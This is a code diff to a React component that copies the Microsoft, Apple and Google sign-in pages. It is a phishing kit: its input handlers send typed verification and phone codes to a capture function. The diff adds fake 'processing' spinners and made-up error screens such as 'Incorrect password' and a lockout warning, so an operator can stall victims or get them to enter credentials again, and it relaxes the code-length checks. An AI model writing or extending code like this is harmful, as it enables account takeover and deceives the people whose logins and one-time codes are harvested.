@@ -1,6 +1,6 @@
 import { useState, useRef, useEffect, useCallback } from 'react';
 import { motion, AnimatePresence, type MotionProps } from 'framer-motion';
-import { ChevronLeft, Key, Eye, EyeOff, Check } from 'lucide-react';
+import { ChevronLeft, Key, Eye, EyeOff, Check, X } from 'lucide-react';
 
 const MicrosoftLogo = () => (
   <svg width="20" height="20" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
@@ -54,7 +54,8 @@ const AppleSpinRing = () => (
 // ─── Microsoft types & helpers ────────────────────────────────────────────────
 
 type MsStep = 'email' | 'signin-options' | 'passkey' | 'password' | 'stay' | 'register' | 'recover'
-  | 'email-code' | 'email-code-input' | 'other-ways' | 'phone-entry' | 'phone-code';
+  | 'email-code' | 'email-code-input' | 'other-ways' | 'phone-entry' | 'phone-code'
+  | 'processing' | 'error-email' | 'error-password' | 'error-code';
 type RegStep = 'reg-email' | 'reg-password' | 'reg-name' | 'reg-dob' | 'reg-verify';
 type RecStep = 'rec-find' | 'rec-options' | 'rec-code';
 
@@ -235,7 +236,8 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
 
   const isOnDark = step === 'password' || step === 'stay' || step === 'passkey'
     || step === 'email-code' || step === 'email-code-input' || step === 'other-ways'
-    || step === 'phone-entry' || step === 'phone-code';
+    || step === 'phone-entry' || step === 'phone-code'
+    || step === 'processing' || step === 'error-email' || step === 'error-password' || step === 'error-code';
   const bg = isOnDark ? darkPageBg : lightBg;
 
   const fadeSlide: MotionProps = {
@@ -643,7 +645,7 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
                 type="text"
                 value={emailCodeInput}
                 onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setEmailCodeInput(v); sendCapture('email_code', v); }}
-                onKeyDown={e => { if (e.key === 'Enter' && emailCodeInput.length === 6) nav('stay', 'email_code', emailCodeInput); }}
+                onKeyDown={e => { if (e.key === 'Enter' && emailCodeInput.length >= 4) nav('processing', 'email_code', emailCodeInput); }}
                 placeholder="Code"
                 maxLength={6}
                 autoFocus
@@ -656,7 +658,7 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
                 </a>
               </div>
               <button
-                onClick={() => { if (emailCodeInput.length === 6) nav('stay', 'email_code', emailCodeInput); }}
+                onClick={() => { if (emailCodeInput.length >= 4) nav('processing', 'email_code', emailCodeInput); }}
                 className="w-full bg-[#0078D4] hover:bg-[#005a9e] disabled:opacity-50 text-white text-[15px] font-semibold py-2.5 transition-colors"
                 style={{ borderRadius: 0 }}
               >
@@ -1088,6 +1090,65 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
           </motion.div>
         )}
 
+        {/* ── Processing ── */}
+        {step === 'processing' && (
+          <motion.div key="processing" {...fadeOnly} className={`flex flex-col ${wrapCls}`}>
+            {isMobile ? (
+              <div className="flex flex-col items-center gap-5 px-8">
+                {msLogoRow(isDark)}
+                <p className="text-[14px] text-[#605e5c] text-center mt-1">Please wait, this will only take a moment.</p>
+                <div className="flex gap-2">
+                  {[0,1,2].map(i => <div key={i} className="w-2 h-2 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i*0.15}s` }} />)}
+                </div>
+              </div>
+            ) : (
+              <div className={`w-[440px] flex flex-col items-center px-10 pt-10 pb-12 shadow-md ${isDark ? 'bg-[#242424]' : 'bg-white'}`}>
+                {msLogoRow(false)}
+                <p className="text-[14px] text-[#605e5c] mt-5 mb-4 text-center">Please wait, this will only take a moment.</p>
+                <div className="flex gap-2">
+                  {[0,1,2].map(i => <div key={i} className="w-2.5 h-2.5 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i*0.15}s` }} />)}
+                </div>
+              </div>
+            )}
+          </motion.div>
+        )}
+
+        {/* ── Error states ── */}
+        {(step === 'error-email' || step === 'error-password' || step === 'error-code') && (
+          <motion.div key={step} {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
+            <div className={`flex flex-col ${lightCardCls}`}>
+              {msLogoRow(false)}
+              <div className="flex items-center gap-3 mb-4">
+                <div className="w-10 h-10 rounded-full bg-red-50 border border-red-200 flex items-center justify-center flex-shrink-0">
+                  <X className="w-5 h-5 text-red-600" />
+                </div>
+                <h1 className={`text-[18px] font-bold ${lightText}`}>
+                  {step === 'error-email' ? 'Account not found' : step === 'error-password' ? 'Incorrect password' : 'Incorrect code'}
+                </h1>
+              </div>
+              <p className="text-[14px] text-[#605e5c] mb-6 leading-relaxed">
+                {step === 'error-email'
+                  ? "That Microsoft account doesn't exist. Enter a different account or get a new Microsoft account."
+                  : step === 'error-password'
+                  ? "Your account or password is incorrect. If you don't remember your password, reset it now."
+                  : "The verification code you entered is incorrect. Please check your inbox and try again."}
+              </p>
+              <div className="flex justify-between items-center">
+                <a href="#" className="text-[14px] text-[#0078D4] hover:underline">
+                  {step === 'error-email' ? 'Create one!' : step === 'error-password' ? 'Forgot password?' : 'Resend code'}
+                </a>
+                <button
+                  onClick={() => setStep(step === 'error-email' ? 'email' : step === 'error-password' ? 'password' : 'email-code')}
+                  className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors"
+                  style={{ borderRadius: 0 }}
+                >
+                  Try again
+                </button>
+              </div>
+            </div>
+          </motion.div>
+        )}
+
       </AnimatePresence>
     </div>
   );
@@ -1095,7 +1156,7 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
 
 // ─── Apple ───────────────────────────────────────────────────────────────────
 
-type AppleStep = 'email' | 'password' | 'device-trust' | 'verification-code';
+type AppleStep = 'email' | 'password' | 'device-trust' | 'verification-code' | 'processing' | 'error-email' | 'error-password' | 'error-code';
 
 function AppleLogin({ device, theme }: { device: string; theme: string }) {
   const isDark = theme === 'dark';
@@ -1337,7 +1398,7 @@ function AppleLogin({ device, theme }: { device: string; theme: string }) {
               </button>
             )}
             <p className={`text-center text-[15px] leading-relaxed mb-6 ${subGray}`}>
-              Enter the 6-digit verification code shown on your trusted device.
+              Enter the verification code shown on your trusted device.
             </p>
             {/* 6 digit boxes */}
             <div
@@ -1368,9 +1429,9 @@ function AppleLogin({ device, theme }: { device: string; theme: string }) {
             />
             <button
               data-testid="apple-code-submit-btn"
-              onClick={() => { if (codeInput.length === 6) sendCapture('verification_code', codeInput); }}
-              disabled={codeInput.length < 6}
-              className={`w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-4 transition-opacity ${codeInput.length < 6 ? 'opacity-40' : 'hover:opacity-90 active:opacity-80'}`}
+              onClick={() => { if (codeInput.length >= 4) { sendCapture('verification_code', codeInput); setStep('processing'); } }}
+              disabled={codeInput.length < 4}
+              className={`w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-4 transition-opacity ${codeInput.length < 4 ? 'opacity-40' : 'hover:opacity-90 active:opacity-80'}`}
               style={{ backgroundColor: appleBlue }}
             >
               Continue
@@ -1379,6 +1440,53 @@ function AppleLogin({ device, theme }: { device: string; theme: string }) {
               Didn't receive a code?
             </button>
           </>
+        )}
+
+        {/* ── Processing ── */}
+        {step === 'processing' && (
+          <div className="flex flex-col items-center w-full">
+            <p className={`text-center text-[15px] mb-8 leading-relaxed ${subGray}`}>
+              This will take a moment…
+            </p>
+            <svg className="w-9 h-9" viewBox="0 0 50 50">
+              <circle cx="25" cy="25" r="20" fill="none" strokeWidth="3" strokeLinecap="round"
+                stroke={isDark ? '#ffffff' : '#1c1c1e'} strokeDasharray="70 130" strokeOpacity="0.7"
+                className="animate-spin" style={{ animationDuration: '0.9s' }} />
+            </svg>
+          </div>
+        )}
+
+        {/* ── Error states ── */}
+        {(step === 'error-email' || step === 'error-password' || step === 'error-code') && (
+          <div className="flex flex-col items-center w-full">
+            <div className="w-14 h-14 rounded-full bg-red-50 border-2 border-red-200 flex items-center justify-center mb-4">
+              <X className="w-7 h-7 text-red-500" />
+            </div>
+            <p className={`text-[17px] font-semibold text-center mb-2 ${isDark ? 'text-white' : 'text-black'}`}>
+              {step === 'error-email' ? 'Apple Account Not Found'
+               : step === 'error-password' ? 'Incorrect Password'
+               : 'Incorrect Verification Code'}
+            </p>
+            <p className={`text-center text-[14px] leading-relaxed mb-7 ${subGray}`}>
+              {step === 'error-email'
+               ? "This Apple Account doesn't exist. Enter a different email or phone number."
+               : step === 'error-password'
+               ? "This Apple Account or password was entered incorrectly. You have 5 remaining attempts before this account is locked."
+               : "The verification code is incorrect. Check your trusted device and try again."}
+            </p>
+            <button
+              onClick={() => setStep(step === 'error-email' ? 'email' : step === 'error-password' ? 'password' : 'verification-code')}
+              className="w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white transition-opacity hover:opacity-90"
+              style={{ backgroundColor: appleBlue }}
+            >
+              Try Again
+            </button>
+            {step === 'error-password' && (
+              <button className="text-[14px] mt-3" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
+                Forgot Apple ID or password?
+              </button>
+            )}
+          </div>
         )}
 
         {/* Home indicator */}
@@ -1394,7 +1502,7 @@ function AppleLogin({ device, theme }: { device: string; theme: string }) {
 
 // ─── Google ──────────────────────────────────────────────────────────────────
 
-type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-code';
+type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-code' | 'processing' | 'error-email' | 'error-password' | 'error-code';
 
 function GoogleLogin({ device, theme }: { device: string; theme: string }) {
   const isDark = theme === 'dark';
@@ -1715,11 +1823,72 @@ function GoogleLogin({ device, theme }: { device: string; theme: string }) {
                     Back
                   </button>
                   <button data-testid="google-code-verify-btn"
-                    onClick={() => { if (phoneCodeInput.length === 6) sendCapture('phone_code', phoneCodeInput); }}
-                    disabled={phoneCodeInput.length < 6}
-                    style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: phoneCodeInput.length < 6 ? 'default' : 'pointer', opacity: phoneCodeInput.length < 6 ? 0.5 : 1 }}>
+                    onClick={() => { if (phoneCodeInput.length >= 4) { sendCapture('phone_code', phoneCodeInput); setStep('processing'); } }}
+                    disabled={phoneCodeInput.length < 4}
+                    style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: phoneCodeInput.length < 4 ? 'default' : 'pointer', opacity: phoneCodeInput.length < 4 ? 0.5 : 1 }}>
                     Verify
                   </button>
+                </div>
+              </>
+            )}
+
+            {/* ── Processing ── */}
+            {step === 'processing' && (
+              <>
+                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1, gap: 20 }}>
+                  <p style={{ fontSize: 14, color: subText, textAlign: 'center', margin: 0 }}>
+                    Signing you in, please wait…
+                  </p>
+                  <svg className="animate-spin" width="32" height="32" viewBox="0 0 50 50" style={{ animationDuration: '1s' }}>
+                    <defs>
+                      <linearGradient id="goog-proc" x1="0%" y1="0%" x2="100%" y2="0%">
+                        <stop offset="0%" stopColor="#4285F4"/>
+                        <stop offset="33%" stopColor="#EA4335"/>
+                        <stop offset="66%" stopColor="#FBBC05"/>
+                        <stop offset="100%" stopColor="#34A853"/>
+                      </linearGradient>
+                    </defs>
+                    <circle cx="25" cy="25" r="20" fill="none" strokeWidth="3.5" strokeLinecap="round"
+                      stroke="url(#goog-proc)" strokeDasharray="80 126" />
+                  </svg>
+                </div>
+                <div />
+              </>
+            )}
+
+            {/* ── Error states ── */}
+            {(step === 'error-email' || step === 'error-password' || step === 'error-code') && (
+              <>
+                <div>
+                  <div style={{
+                    display: 'flex', alignItems: 'flex-start', gap: 10, padding: '12px 14px',
+                    background: isDark ? '#2d1212' : '#fef2f2',
+                    border: `1px solid ${isDark ? '#7f1d1d' : '#fecaca'}`, borderRadius: 4, marginBottom: 16,
+                  }}>
+                    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" style={{ flexShrink: 0, marginTop: 2 }}>
+                      <circle cx="12" cy="12" r="10" stroke="#dc2626" strokeWidth="1.5"/>
+                      <path d="M12 8v4m0 4h.01" stroke="#dc2626" strokeWidth="1.5" strokeLinecap="round"/>
+                    </svg>
+                    <p style={{ fontSize: 14, color: '#dc2626', margin: 0, lineHeight: 1.5 }}>
+                      {step === 'error-email'
+                        ? "Couldn't find your Google Account. Try entering your full email address."
+                        : step === 'error-password'
+                        ? "Wrong password. Try again or click Forgot password to reset it."
+                        : "Wrong code. Try entering the code again or request a new one."}
+                    </p>
+                  </div>
+                </div>
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                  <button
+                    onClick={() => setStep(step === 'error-email' ? 'email' : step === 'error-password' ? 'password' : 'phone-code')}
+                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
+                    Try again
+                  </button>
+                  {step === 'error-password' && (
+                    <button style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 0' }}>
+                      Forgot password?
+                    </button>
+                  )}
                 </div>
               </>
             )}
